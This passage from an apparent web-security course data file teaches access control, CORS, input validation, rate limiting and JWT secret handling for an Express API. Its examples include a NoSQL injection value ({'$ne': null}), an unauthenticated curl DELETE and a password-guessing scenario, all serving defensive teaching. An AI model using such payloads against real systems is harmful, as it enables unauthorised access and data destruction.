    summary: 'An **ownership check** compares the user in the verified token (`req.user.sub`) with the owner stored on the resource before reading or changing it; a **role check** asks whether the user\'s role (for example `admin`) permits the action at all.',
    html: [
      '<p>A hotel key card proves you are a guest; it opens only your room. In an API the room number is the id in the URL, so a server that only checks the token lets Ana read Ben\'s data by typing <code>/tasks/8</code> instead of <code>/tasks/7</code>. This is <strong>broken access control</strong>, also called IDOR (insecure direct object reference), and it is the number one risk in the OWASP Top 10.</p>',
      '<ul><li><strong>The owner always comes from the verified token,</strong> never from the body, query or URL: on create you store <code>req.user.sub</code>, and a <code>userId</code> sent by the client is ignored.</li>'
        + '<li><strong>Every read, update and delete of one resource loads it and compares owners</strong> before doing anything: <code>404</code> if it does not exist, <code>403</code> if it is not yours.</li>'
        + '<li><strong>Lists filter in the database query</strong> (<code>findByOwner(req.user.sub, …)</code>), so other people\'s rows never leave the database.</li>'
        + '<li><strong>Compare values of the same type:</strong> a JWT can carry <code>sub</code> as a number (<code>42</code>) while <code>pg</code> returns a <code>BIGINT</code> column as a string (<code>"42"</code>), and <code>42 !== "42"</code>. Write <code>Number(task.user_id) !== Number(req.user.sub)</code>.</li>'
        + '<li><strong>Roles add a second layer:</strong> the token also carries <code>role</code> (<code>user</code> or <code>admin</code>), and a middleware such as <code>requireRole(\'admin\')</code> refuses a whole route to everyone else with <code>403</code>.</li></ul>',
    ],
    diagram: {
      kind: 'branch',
      title: 'Load first, then compare owners: the answer depends on whose resource it is.',
      desc: 'The controller loads the resource by the id in the URL. If it does not exist, the answer is 404. If it exists but its owner is not the user in the token, the answer is 403. If the owner matches, the action runs and the answer is 200.',
      nodes: [
        { id: 'load', label: 'Load task 7', note: 'the id from the URL', key: true },
        { id: 'nf', label: '404', note: 'it does not exist' },
        { id: 'fb', label: '403', note: 'not yours' },
        { id: 'ok', label: '200', note: 'yours: the action runs' },
      ],
      edges: [['load', 'nf', 'none'], ['load', 'fb', 'other owner'], ['load', 'ok', 'owner matches']],
    },
    code: `// A notes API (the same pattern works for tasks): load, 404, then 403.
async function getNote(req, res, next) {
  try {
    const note = await notesModel.findById(Number(req.params.id));
    if (!note) return res.status(404).json({ error: 'Note not found' });
    if (Number(note.owner_id) !== Number(req.user.sub)) {
      return res.status(403).json({ error: 'This note is not yours' });
    }
    res.json(toDTO(note));
  } catch (err) {
    next(err);
  }
}

// A role check: a middleware factory used after auth.
const requireRole = (role) => (req, res, next) =>
  (req.user.role === role ? next() : res.status(403).json({ error: 'Forbidden' }));

router.delete('/:id', requireRole('admin'), deleteNote);`,
    example: 'Ana (`sub: 1`) sends `PUT /notes/8`; note 8 has `owner_id: 2`. Her token is perfect, so `auth` lets her through, and the controller answers **403**. She then sends `POST /notes` with the body `{"title":"Hi","userId":2}`: the server ignores `userId` and stores the note with owner `1`, the `sub` from her token.',
    mistake: 'Taking the owner from the request: `create({ ...req.body })` or `findByOwner(req.query.userId)`. Anything the client sends can be changed by the client; only the verified token says who is calling. A second classic: comparing ids with `!==` without converting them, so every owner gets `403` (or, with `!=`, getting lucky without understanding why).' },

  /* ---- 5. CORS ---------------------------------------------------------------------------- */
  { id: 'same-origin-policy', hub: 'cors', topic: 'cors',
    title: 'Origins and the same-origin policy',
    summary: 'An **origin** is the scheme + host + port of a URL; the browser\'s **same-origin policy** lets a page\'s JavaScript read responses freely only from its own origin.',
    html: [
      '<p>You are logged in to your bank in one tab; another tab has a random site open. If that site\'s JavaScript could <code>fetch</code> your bank\'s pages, with your cookies, and <strong>read</strong> them, it could read your account. The same-origin policy is the browser protecting <strong>the user</strong> from other sites: a rule the browser enforces, not something your server does.</p>',
      '<table><caption>Compared with <code>http://localhost:3000/api/tasks</code></caption><thead><tr><th scope="col">URL</th><th scope="col">Same origin?</th><th scope="col">Why</th></tr></thead><tbody>'
        + '<tr><th scope="row"><code>http://localhost:3000/index.html</code></th><td>Yes</td><td>Only the path differs, and the path does not count</td></tr>'
        + '<tr><th scope="row"><code>http://localhost:5173/</code></th><td>No</td><td>Port 5173 ≠ 3000</td></tr>'
        + '<tr><th scope="row"><code>https://localhost:3000/</code></th><td>No</td><td>Scheme https ≠ http</td></tr>'
        + '<tr><th scope="row"><code>http://127.0.0.1:3000/</code></th><td>No</td><td>Host 127.0.0.1 ≠ localhost (same machine, different name)</td></tr>'
        + '<tr><th scope="row"><code>http://localhost/</code></th><td>No</td><td>No port written means 80 ≠ 3000 (see <a href="#/http/web/url-anatomy">URL anatomy</a>)</td></tr>'
        + '</tbody></table>',
      '<ul><li><strong>What it blocks:</strong> JavaScript <strong>reading</strong> a cross-origin response (<code>fetch</code>).</li>'
        + '<li><strong>What it does not block:</strong> embedding other origins (<code>&lt;img&gt;</code>, <code>&lt;script src&gt;</code>, stylesheets), submitting forms and following links to them: that is how the web has always worked.</li>'
        + '<li><strong>Many cross-origin requests are still sent:</strong> the browser just refuses to hand the answer to the script.</li>'
        + '<li><strong>The usual development setup is cross-origin:</strong> React on <code>localhost:5173</code> calling Express on <code>localhost:3000</code>, which is why the API needs <a href="#/server/auth/cors-headers">CORS headers</a>. Serving the page from Express itself with <code>express.static</code> gives page and API one origin.</li></ul>',
    ],
    example: 'The page at `http://localhost:5173` runs `fetch(\'http://localhost:3000/api/tasks\')`. The ports differ, so it is cross-origin. With no CORS configured, the Express terminal still logs `GET /api/tasks`: the request arrived and the route ran. But the browser console shows a CORS error and the page\'s `fetch` rejects with `TypeError: Failed to fetch`.',
    mistake: '"The same-origin policy stops the request from reaching the server." For many requests it does not: the server receives and runs them, and only the response is hidden from the page. That is one more reason why a `GET` must never change data, and why CORS settings are no replacement for authentication.' },

  { id: 'cors-headers', hub: 'cors', topic: 'cors',
    title: 'CORS: the server says who may read',
    summary: '**CORS** (Cross-Origin Resource Sharing) is a set of HTTP response headers with which a server tells the browser which other origins may read its responses; the key one is `Access-Control-Allow-Origin`.',
    html: [
      '<p>The API writes the list; the browser enforces it. On a cross-origin request the browser adds <code>Origin: http://localhost:5173</code>; the API answers with <code>Access-Control-Allow-Origin: http://localhost:5173</code> (or <code>*</code>, meaning anyone). If they match, the page\'s JavaScript gets the response; if the header is missing or different, it does not.</p>',
      '<dl><dt>Simple request</dt><dd>One an old-fashioned HTML form could already send: method <code>GET</code>, <code>HEAD</code> or <code>POST</code>; only "safelisted" headers (such as <code>Accept</code>); and, with a body, a <code>Content-Type</code> of <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code> or <code>text/plain</code>. The browser sends it straight away and checks the CORS headers on the answer.</dd>'
        + '<dt>Any other request</dt><dd>A <code>PUT</code>, a JSON body, an <code>Authorization</code> header: the browser first asks permission with a <a href="#/server/auth/cors-preflight">preflight</a>.</dd></dl>',
      '<ul><li><strong>The <code>cors</code> package</strong> is not part of Express: <code>npm install cors</code>.</li>'
        + '<li><strong><code>app.use(cors())</code> with no options</strong> sends <code>Access-Control-Allow-Origin: *</code> on every route: fine for a public, read-only API, too wide for one with user accounts.</li>'
        + '<li><strong>Pass <code>origin</code></strong> with the exact front-end origin, or an array of them, and mount it <strong>before</strong> the routers.</li></ul>',
    ],
    code: `// npm install cors
const cors = require('cors');

// before the routers (and before auth)
app.use(cors({ origin: 'http://localhost:5173' }));
app.use(express.json());
app.use('/api/tasks', tasksRouter);

// The exchange it produces:
// GET /api/tasks HTTP/1.1
// Origin: http://localhost:5173
//
// HTTP/1.1 200 OK
// Access-Control-Allow-Origin: http://localhost:5173
// Vary: Origin            ← caches must keep one copy per Origin
// Content-Type: application/json; charset=utf-8`,
    example: 'With `cors({ origin: \'http://localhost:5173\' })`, the React page reads the tasks. A page on `https://evil.example` making the same call gets `Access-Control-Allow-Origin: http://localhost:5173`, which does not match its own origin, so the browser blocks it with the message "…has a value \'http://localhost:5173\' that is not equal to the supplied origin". Try both in the CORS simulator on this card.',
    mistake: 'Adding `Access-Control-Allow-Origin` to the **request** in the front-end code: `fetch(url, { headers: { \'Access-Control-Allow-Origin\': \'*\' } })`. It is a **response** header that only the server can grant; on a request it does nothing useful, and as a non-safelisted header it even triggers a preflight.',
    widget: 'cors-sim' },

  { id: 'cors-preflight', hub: 'cors', topic: 'cors',
    title: 'Preflight requests',
    summary: 'Before a cross-origin request that is not "simple" (for example a `PUT`, a `DELETE`, a JSON body or an `Authorization` header), the browser first sends an `OPTIONS` **preflight** asking for permission, and sends the real request only if the answer allows it.',
    html: [
      '<p>Servers written before CORS existed never expected a web page to send them a <code>DELETE</code> or a JSON body. The preflight protects them: the browser asks first, and if the answer is no, the real request is <strong>never sent</strong>.</p>',
      '<h3>When the browser preflights</h3>',
      '<ul><li><strong>The method</strong> is not <code>GET</code>, <code>HEAD</code> or <code>POST</code>;</li>'
        + '<li><strong>or a header</strong> other than <code>Accept</code>, <code>Accept-Language</code>, <code>Content-Language</code> and <code>Content-Type</code> is sent (<code>Authorization</code> always counts);</li>'
        + '<li><strong>or <code>Content-Type</code></strong> is anything other than the three form types (<code>application/json</code> counts).</li>'
        + '<li><strong>Cookies</strong> (<code>credentials</code>) do not cause a preflight on their own.</li></ul>',
      '<dl><dt>The question (<code>OPTIONS</code>)</dt><dd><code>Origin</code>, <code>Access-Control-Request-Method</code> (the method it wants to use) and <code>Access-Control-Request-Headers</code> (the non-safelisted headers it wants to send).</dd>'
        + '<dt>The answer</dt><dd>A 2xx status with a matching <code>Access-Control-Allow-Origin</code>, the method in <code>Access-Control-Allow-Methods</code> and every requested header in <code>Access-Control-Allow-Headers</code>. <code>Access-Control-Max-Age</code> lets the browser reuse the permission for some seconds. The <code>cors</code> middleware answers preflights by itself with <code>204</code>.</dd></dl>',
      '<p>For a React front end calling a JWT-protected API, <strong>every</strong> call that sends <code>Authorization</code>, and every JSON <code>POST</code> or <code>PUT</code>, is preflighted: the Network tab shows two rows, <code>OPTIONS</code> and then the real request.</p>',
    ],
    diagram: {
      kind: 'sequence',
      numbered: true,
      title: 'The browser asks first; the real request goes only if the API agrees.',
      desc: 'Step 1: the browser sends OPTIONS /api/tasks/7 asking to use DELETE with an authorization header. Step 2: the API answers 204 with the allowed origin, methods and headers. Step 3: the browser checks that DELETE and the header are allowed. Step 4: only then does it send the real DELETE with the token. Step 5: the API answers 204.',
      nodes: [
        { id: 'b', label: 'Browser', note: 'page on `:5173`' },
        { id: 'a', label: 'API', note: '`:3000`' },
      ],
      edges: [
        ['b', 'a', '`OPTIONS /api/tasks/7` (preflight)'],
        ['a', 'b', '204 + allowed methods and headers'],
        ['b', 'b', 'is DELETE allowed?'],
        ['b', 'a', '`DELETE /api/tasks/7` + token'],
        ['a', 'b', '204 No Content'],
      ],
    },
    code: `OPTIONS /api/tasks/7 HTTP/1.1
Host: localhost:3000
Origin: http://localhost:5173
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: authorization
Access-Control-Max-Age: 600
Vary: Origin, Access-Control-Request-Headers`,
    dialect: 'HTTP',
    example: 'The React page runs `fetch(\'http://localhost:3000/api/tasks/7\', { method: \'DELETE\', headers: { Authorization: \'Bearer …\' } })` against `cors({ origin: \'http://localhost:5173\', methods: [\'GET\', \'POST\'] })`. The preflight answer lists only `GET,POST`, so Chrome logs "Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response.", the `DELETE` is never sent and the task is still there.',
    mistake: 'Mounting the auth middleware before `cors`. The browser never sends `Authorization` on a preflight, so `auth` answers the `OPTIONS` request with `401`; a preflight that is not 2xx fails, and every protected call from the front end shows a CORS error even though the token is fine. Put `app.use(cors(…))` first.',
    practice: { href: '#/server/auth/practice/cors-sim', label: 'Solve the preflight challenges in the CORS simulator' } },

  { id: 'cors-credentials', hub: 'cors', topic: 'cors',
    title: 'Cookies across origins: credentials',
    summary: 'By default `fetch` does not send cookies to another origin; to send them the page must ask with `credentials: \'include\'`, and the server must answer with an **exact** origin (never `*`) plus `Access-Control-Allow-Credentials: true`.',
    html: [
      '<p>This is a double consent: the page asks to bring the user\'s cookies along, and the server must answer "yes, and only for <strong>you</strong>". A wildcard is forbidden because "any site may read responses made with this user\'s cookies" would switch the same-origin policy off entirely.</p>',
      '<ul><li><strong>The page</strong> uses <code>credentials: \'include\'</code>.</li>'
        + '<li><strong>The response</strong> has <code>Access-Control-Allow-Origin</code> equal to the page\'s origin and <code>Access-Control-Allow-Credentials: true</code>; on a preflight, <code>*</code> in the allowed methods or headers no longer counts as a wildcard either. In Express: <code>cors({ origin: \'http://localhost:5173\', credentials: true })</code>.</li>'
        + '<li><strong>Never <code>origin: true</code> with credentials:</strong> it echoes back whatever origin asks, so every website could read your users\' data with their cookies.</li>'
        + '<li><strong>A Bearer token in a header</strong> instead of cookies needs no credentials at all.</li>'
        + '<li><strong>Same site, different origin:</strong> <code>localhost:5173</code> and <code>localhost:3000</code> are different origins but the same <strong>site</strong> (a site ignores the port), so <code>SameSite=Lax</code> cookies still flow in development; on different domains in production you need <code>SameSite=None; Secure</code>.</li></ul>',
    ],
    code: `// Server
app.use(cors({ origin: 'http://localhost:5173', credentials: true }));

// Page
const res = await fetch('http://localhost:3000/api/me', { credentials: 'include' });`,
    example: 'With plain `cors()` and `credentials: \'include\'`, Chrome logs: "The value of the \'Access-Control-Allow-Origin\' header in the response must not be the wildcard \'*\' when the request\'s credentials mode is \'include\'." Changing the server to an exact origin and `credentials: true` fixes it. Challenge 5 of the simulator is exactly this.',
    mistake: '`cors({ origin: \'*\', credentials: true })`. The `cors` package sends exactly what you asked for, `*` together with `Allow-Credentials: true`, and the browser rejects that combination, so nothing works and the configuration looks "correct" in the code.' },

  { id: 'cors-not-security', hub: 'cors', topic: 'cors',
    title: 'What CORS is not',
    summary: 'CORS is enforced **only by browsers** and only controls which web pages may **read** responses; it does not identify anyone, and it does not stop curl, Postman, scripts or other servers from calling your API.',
    html: [
      '<p>CORS is a rule browsers apply to protect <strong>their users</strong>, not a lock on your server. The lock is authentication (a valid token), authorisation (ownership and roles) and validation.</p>',
      '<table><caption>Who CORS applies to</caption><thead><tr><th scope="col">Client</th><th scope="col">Sends <code>Origin</code>?</th><th scope="col">Checks CORS headers?</th><th scope="col">Can call your API?</th></tr></thead><tbody>'
        + '<tr><th scope="row">Your React page (another origin)</th><td>Yes</td><td>Yes</td><td>Yes, and reads the answer if CORS allows it</td></tr>'
        + '<tr><th scope="row">A page on another site</th><td>Yes</td><td>Yes</td><td>Simple requests are sent and run; reading is blocked</td></tr>'
        + '<tr><th scope="row">curl, Postman, a script</th><td>No</td><td>No</td><td>Yes, always</td></tr>'
        + '<tr><th scope="row">Another server (Node <code>fetch</code>)</th><td>No</td><td>No</td><td>Yes, always</td></tr>'
        + '</tbody></table>',
      '<ul><li><strong>"It works in Postman but not in React":</strong> the API is fine; the browser is blocking the page because of CORS.</li>'
        + '<li><strong>CORS can only relax the same-origin policy:</strong> adding <code>cors()</code> never makes an API safer, and a careless configuration (<code>origin: true</code> with <code>credentials: true</code>) makes it less safe.</li>'
        + '<li><strong>Simple requests run before the browser checks the answer,</strong> so a cross-site form <code>POST</code> still runs on your server: protecting state-changing routes is the server\'s job (auth, SameSite cookies).</li></ul>',
    ],
    example: 'Your API uses `cors({ origin: \'http://localhost:5173\' })` but forgot the auth middleware on `DELETE /api/tasks/:id`. Anyone can run `curl -X DELETE http://localhost:3000/api/tasks/7` and the task is gone: the CORS setting played no part.',
    mistake: '"I restricted CORS to my front end, so only my front end can use my API." Anyone can still call it outside a browser, and even inside a browser other sites\' simple requests reach the server. Only authentication and authorisation decide who may do what.' },

  /* ---- 6. Hardening the API --------------------------------------------------------------- */
  { id: 'validation', hub: 'hardening', topic: 'hardening',
    title: 'Validation with a schema: Zod and a validate middleware',
    summary: '**Input validation** checks every value that arrives over HTTP against a declared shape before your code uses it; with **Zod** you declare the shape once as a schema, and one `validate(schema)` middleware rejects bad input with `400` before any controller runs.',
    html: [
      '<p>Why and what to check (never trust <code>req.body</code>, report <strong>all</strong> problems, <code>400</code> vs <code>422</code>, unknown fields) is in <a href="#/http/api-design/validation">Validating input</a>. This card is the library way: write the rules once as a schema, and let one middleware enforce them on every route that writes.</p>',
      '<dl><dt><code>z.object({ … })</code></dt><dd>The schema: each field with its type and rules (<code>z.string().trim().min(1)</code>, <code>z.boolean().default(false)</code>). Zod version 3 in these examples (<code>npm install zod</code>).</dd>'
        + '<dt><code>schema.safeParse(value)</code></dt><dd>Never throws: returns <code>{ success: true, data }</code> or <code>{ success: false, error }</code>.</dd>'
        + '<dt><code>error.issues</code></dt><dd>An array of problems, each with a <code>path</code> (which field), a <code>message</code> and a <code>code</code>.</dd>'
        + '<dt>Unknown keys</dt><dd>Object schemas <strong>strip</strong> them by default, so <code>userId</code> and <code>isAdmin</code> disappear from <code>data</code>; <code>.strict()</code> rejects them instead.</dd></dl>',
      '<p>Stripping only helps if the controller continues with <code>data</code>, which is why the middleware <strong>replaces</strong> <code>req.body</code>. Checking types also blocks injection: if <code>email</code> must be a string, it cannot be the object <code>{"$ne": null}</code> (see <a href="#/database/documents/node-driver">NoSQL injection</a>).</p>',
    ],
    diagram: {
      kind: 'branch',
      title: 'Bad input stops at the gate; the controller only ever sees clean data.',
      desc: 'The request body goes through validate with the route\'s schema. If the body is invalid, the middleware answers 400 with every issue and the controller never runs. If it is valid, req.body is replaced by the parsed data, with unknown keys removed and defaults filled in, and the controller runs.',
      nodes: [
        { id: 'body', label: '`req.body`', note: 'whatever the client sent' },
        { id: 'v', label: '`validate(schema)`', note: '`safeParse`', key: true },
        { id: 'bad', label: '400', note: 'all the issues' },
        { id: 'ok', label: 'The controller', note: '`req.body` = parsed data' },
      ],
      edges: [['body', 'v'], ['v', 'bad', 'invalid'], ['v', 'ok', 'valid']],
    },
    code: `const { z } = require('zod');

const taskSchema = z.object({
  title: z.string().trim().min(1).max(120),
  done: z.boolean().default(false),
});

taskSchema.safeParse({ title: '', done: 'yes', userId: 7 });
// → { success: false, error } with error.issues:
//   [ { code: 'too_small', path: ['title'], message: 'String must contain at least 1 character(s)', … },
//     { code: 'invalid_type', path: ['done'], message: 'Expected boolean, received string', … } ]

taskSchema.safeParse({ title: '  Buy milk ', userId: 7 });
// → { success: true, data: { title: 'Buy milk', done: false } }   userId stripped, default added

// middleware/validate.js: one middleware for every schema
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) return res.status(400).json({ error: result.error.issues });
    // continue with the parsed data only
    req.body = result.data;
    next();
  };
}

// routes/tasks.js: every route that writes
router.post('/', validate(taskSchema), createTask);
router.put('/:id', validate(taskSchema), replaceTask);`,
    example: '`POST /tasks` with `{"done":true}` (no title) never reaches the controller: `validate(taskSchema)` answers **400** `{"error":[{"code":"invalid_type","path":["title"],"message":"Required",…}]}`. With `{"title":"Buy milk","userId":99}` it passes, `req.body` becomes `{ title: \'Buy milk\', done: false }`, and the controller sets the owner from `req.user.sub`.',
    mistake: 'Validating and then carrying on with the original `req.body` instead of the parsed data: the stripped fields (`userId`, `isAdmin`) come straight back. Another: validating `POST` but forgetting `PUT` and `PATCH`, which write to the same database.' },

  { id: 'security-middleware', hub: 'hardening', topic: 'hardening',
    title: 'Security middleware: helmet, rate limits, body limits, HTTPS',
    summary: 'A few lines of middleware close whole classes of holes: **helmet** sets protective response headers, **express-rate-limit** caps how many requests one client may send, `express.json({ limit })` caps body size, and HTTPS with **HSTS** keeps passwords and tokens from crossing the network in plain text.',
    html: [
      '<p>Users never notice these layers, and each one stops an entire category of attack for almost no effort. None of the packages come with Express: <code>npm install helmet express-rate-limit</code>.</p>',
      '<table><caption>What each one protects against</caption><thead><tr><th scope="col">Middleware</th><th scope="col">Protects against</th><th scope="col">When it triggers</th></tr></thead><tbody>'
        + '<tr><th scope="row"><code>helmet()</code></th><td>MIME sniffing, clickjacking, some XSS, revealing that you run Express</td><td>Adds headers to every response</td></tr>'
        + '<tr><th scope="row"><code>rateLimit(…)</code></th><td>Password guessing, scrapers, one client flooding the API</td><td><code>429 Too Many Requests</code></td></tr>'
        + '<tr><th scope="row"><code>express.json({ limit })</code></th><td>Huge bodies that exhaust memory</td><td><code>413 Payload Too Large</code></td></tr>'
        + '<tr><th scope="row"><code>cors({ origin })</code></th><td>Other web pages reading your API in a browser</td><td>Missing CORS headers: the browser blocks</td></tr>'
        + '<tr><th scope="row">HTTPS + HSTS</th><td>Passwords and tokens read on the network</td><td>Always (with HSTS the browser refuses plain http)</td></tr>'
        + '</tbody></table>',
      '<dl><dt><code>helmet()</code></dt><dd>Sets <code>X-Content-Type-Options: nosniff</code>, <code>Content-Security-Policy</code> (which scripts may run), <code>Strict-Transport-Security</code> and <code>X-Frame-Options</code> (no embedding your pages in another site\'s frame), and removes <code>X-Powered-By: Express</code>.</dd>'
        + '<dt>express-rate-limit</dt><dd>Answers <code>429</code> once one IP address exceeds a limit; a strict one on <code>/auth/login</code> stops password guessing.</dd>'
        + '<dt>Body limit</dt><dd>The body parser already rejects bodies over <code>100kb</code> with <code>413</code> (see <a href="#/server/routes/body-parsing">express.json()</a>): the point is never to raise it carelessly.</dd>'
        + '<dt>HTTPS and HSTS</dt><dd>HTTPS encrypts everything, including <code>Authorization</code>; in production the hosting platform or a proxy usually handles it. HSTS (<code>Strict-Transport-Security: max-age=…</code>) tells browsers to use only HTTPS for your domain from then on.</dd></dl>',
      '<p>And the error handler never sends <code>err.stack</code> to the client (see <a href="#/server/routes/error-handler">The error handler</a>).</p>',
    ],
    code: `const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

app.use(helmet());
// the default: keep it small
app.use(express.json({ limit: '100kb' }));
app.use('/auth/login', rateLimit({ windowMs: 15 * 60 * 1000, limit: 10 }));
// → 10 tries / 15 min / IP
app.use(rateLimit({ windowMs: 60 * 1000, limit: 100 }));
// → 100 requests / min / IP
// express-rate-limit 7 calls the option \`limit\`; older versions and many tutorials call it \`max\`.`,
    example: 'An attacker scripts 10,000 log-in attempts for `ana@example.com`. With the log-in limiter, attempt 11 within 15 minutes gets **429**; at 10 tries per quarter of an hour, 10,000 guesses take more than ten days, and bcrypt makes each one slow on top. Without it, the only limit is your server\'s CPU.',
    mistake: 'Thinking `helmet()` "secures the API". It only sets response headers: it does nothing against broken access control, injection or a leaked secret. Security middleware is a seatbelt, not a substitute for driving carefully.' },

  { id: 'secrets-env', hub: 'hardening', topic: 'hardening',
    title: 'The signing secret: leaks and fallbacks',
    summary: 'Whoever holds `JWT_SECRET` can sign a valid token for **any** user with **any** role, so the secret lives only in the server\'s environment and is changed (rotated) the moment it may have leaked.',
    html: [
      '<p>How <code>.env</code> files, <code>.gitignore</code> and a fail-fast config module work is in <a href="#/server/runtime/dotenv-secrets">.env files and secrets</a>. This card is what is specific to authentication: the signing secret is the master key of every account.</p>',
      '<ul><li><strong>A leaked secret signs admin tokens:</strong> <code>{ sub: 1, role: \'admin\' }</code>, signed in seconds with the leaked value, passes <code>jwt.verify</code> on your server.</li>'
        + '<li><strong>Rotation logs everyone out:</strong> after you change the secret, every existing token stops verifying and every user logs in again. That is the price, and it is worth paying.</li>'
        + '<li><strong>A committed secret is a leaked secret,</strong> even if a later commit deletes it: Git keeps the history.</li>'
        + '<li><strong>The development fallback trap:</strong> example projects write <code>process.env.JWT_SECRET || \'dev-secret-change-me\'</code> so they run with zero setup. In production, a missing variable silently falls back to a secret printed in a public repository: fail fast there instead.</li></ul>',
    ],
    code: `// .env  (in .gitignore, never committed)
// JWT_SECRET=3f9c2b7e0d8a41f6b5c3e9a7d2f1084c6b5a3e2d1f0c9b8a7e6d5c4b3a291807

// config.js
// or start Node 20.6+ with: node --env-file=.env src/server.js
require('dotenv').config();
const isProduction = process.env.NODE_ENV === 'production';
if (isProduction && !process.env.JWT_SECRET) {
  // crash at start-up, not on the first log-in
  throw new Error('JWT_SECRET is missing');
}
module.exports = { jwtSecret: process.env.JWT_SECRET || 'dev-secret-change-me' };`,
    example: 'A pair pushes `const JWT_SECRET = \'riverside123\';` to a public repository. Anyone can read it, sign a token saying `role: admin` and delete every fixture. The fix: generate a new random secret, put it in the server\'s environment, remove it from the code, and accept that every user has to log in again.',
    mistake: 'Treating the fallback as harmless "because it is only for development": if `JWT_SECRET` is missing in production, the server signs with the public fallback and anyone who has read the repository can sign admin tokens. The other quiet leak is logging `process.env` or the whole config at start-up, which prints the secret into log files.' },

  { id: 'pagination-limits', hub: 'hardening', topic: 'hardening',
    title: 'Pagination limits as protection',
    summary: 'A list endpoint returns one page at a time, chosen by `?page=` and `?limit=`, and the server **clamps** both to safe bounds, so no caller can make it read and send an unbounded number of rows.',
    html: [
      '<p>Without a cap, <code>GET /tasks</code> on a table with a million rows makes the database read them all and Node hold them in memory as one gigantic JSON string: one request slows the server down for everyone, a <strong>denial of service</strong> (DoS). The pagination contract itself (<code>?page=&amp;limit=</code>, an array body and an <code>X-Total-Count</code> header) is in <a href="#/http/api-design/query-params">Filters, sorting and pagination</a>; this card is its security side, the clamp.</p>',
      '<ul><li><strong>Query values arrive as strings,</strong> or missing, or as arrays (<code>?limit=1&amp;limit=2</code>; see <a href="#/server/routes/query-strings">req.query</a>): convert with <code>Number</code>, and fall back to a default when the result is not a usable number.</li>'
        + '<li><strong>Clamp both bounds:</strong> round to an integer, then <code>page ≥ 1</code> and <code>1 ≤ limit ≤ 100</code>; the server computes <code>offset = (page - 1) * limit</code>.</li>'
        + '<li><strong>In SQL</strong> the page becomes <code>LIMIT $1 OFFSET $2</code>, always with an <code>ORDER BY</code> and always parameterised (see <a href="#/database/relational/pagination">Pagination in SQL</a>).</li>'
        + '<li><strong>Huge offsets still cost work,</strong> because the database skips that many rows: very large tables use <strong>cursor pagination</strong> ("the 20 after id 4520") instead.</li></ul>',
    ],
    live: { kind: 'js', code: `function clampPage(query) {
  const page = Math.max(1, Math.floor(Number(query.page)) || 1);
  const limit = Math.min(100, Math.max(1, Math.floor(Number(query.limit)) || 20));
  return { page, limit, offset: (page - 1) * limit };
}

// nothing sent: defaults
console.log(clampPage({}));
// query values are strings
console.log(clampPage({ page: '3', limit: '10' }));
// both clamps at work
console.log(clampPage({ page: '0', limit: '999' }));
// negative values
console.log(clampPage({ page: '-4', limit: '-1' }));
// junk and decimals
console.log(clampPage({ page: 'abc', limit: '2.7' }));

// A common snippet with no lower bound for limit:
const naiveLimit = (q) => Math.min(100, Number(q.limit) || 20);
console.log(naiveLimit({ limit: '-1' }));
// → -1 would reach SQL as LIMIT -1` },
    example: '`GET /tasks?limit=999999` gives 100 items, `?page=0` is treated as page 1, and `?limit=abc` falls back to 20. With the naive snippet, `?limit=-1` passes `-1` to the database: PostgreSQL rejects `LIMIT -1` with an error (a `500` for the client) and SQLite treats it as "no limit at all".',
    mistake: 'Clamping only the upper bound (as many tutorial snippets do), or using `req.query.limit` directly. Remember that `Number(\'0\') || 20` is `20` (0 is falsy) and that `Number(\'-5\')` is a perfectly truthy `-5`.' },

  { id: 'owasp-risks', hub: 'hardening', topic: 'hardening',
    title: 'The security mistakes small APIs actually make',
    summary: 'Most breaches of small APIs come from a handful of mistakes that the **OWASP Top 10** lists every few years: broken access control, injection, exposed secrets, weak authentication and careless configuration. Each one has a known, simple defence.',
    html: [
      '<p><strong>OWASP</strong> (the Open Worldwide Application Security Project) publishes the most common categories of web vulnerability, so developers can check the open doors first. <strong>Broken access control</strong> has been number one since 2021. Read the table as a checklist before you publish or deploy anything.</p>',
      '<table><caption>Risk → how it looks → defence</caption><thead><tr><th scope="col">Risk</th><th scope="col">In a small API</th><th scope="col">Defence</th><th scope="col">Where</th></tr></thead><tbody>'
        + '<tr><th scope="row">Broken access control</th><td><code>GET /tasks/8</code> returns another user\'s task; the owner comes from the body</td><td>Ownership check with the owner from the token; filter lists by owner</td><td><a href="#/server/auth/ownership-checks">Ownership and roles</a></td></tr>'
        + '<tr><th scope="row">Injection (SQL)</th><td>String concatenation in a query</td><td>Parameterised queries (<code>$1</code>, <code>?</code>)</td><td><a href="#/database/relational/sql-injection">SQL injection</a></td></tr>'
        + '<tr><th scope="row">Injection (NoSQL)</th><td><code>{"email":{"$ne":null}}</code> passed into a MongoDB <code>find</code></td><td>Validate types with a schema</td><td><a href="#/server/auth/validation">Validation with a schema</a></td></tr>'
        + '<tr><th scope="row">Cross-site scripting (XSS)</th><td>API data inserted with <code>innerHTML</code></td><td><code>textContent</code>; React escapes by default</td><td><a href="#/browser/dom/text-vs-html">textContent vs innerHTML</a></td></tr>'
        + '<tr><th scope="row">Exposed secrets or data</th><td><code>JWT_SECRET</code> in Git; stack traces or <code>password_hash</code> in responses</td><td>Environment variables, rotation, generic error messages, a DTO</td><td><a href="#/server/auth/secrets-env">The signing secret</a></td></tr>'
        + '<tr><th scope="row">Authentication failures</th><td>Plaintext or fast hashes, no rate limit, tokens without <code>exp</code>, <code>jwt.decode</code>, <code>alg: none</code></td><td>bcrypt, a log-in limiter, <code>expiresIn</code>, <code>jwt.verify</code> with <code>algorithms</code></td><td>The Passwords and Tokens groups</td></tr>'
        + '<tr><th scope="row">Security misconfiguration</th><td><code>cors({ origin: true, credentials: true })</code>, <code>X-Powered-By</code>, debug output</td><td>Exact CORS origins, helmet</td><td><a href="#/server/auth/security-middleware">Security middleware</a></td></tr>'
        + '<tr><th scope="row">Vulnerable dependencies</th><td>Old packages with known holes</td><td><code>npm audit</code>, keep <code>package-lock.json</code>, update</td><td><a href="#/server/runtime/lockfile">package-lock.json</a></td></tr>'
        + '</tbody></table>',
    ],
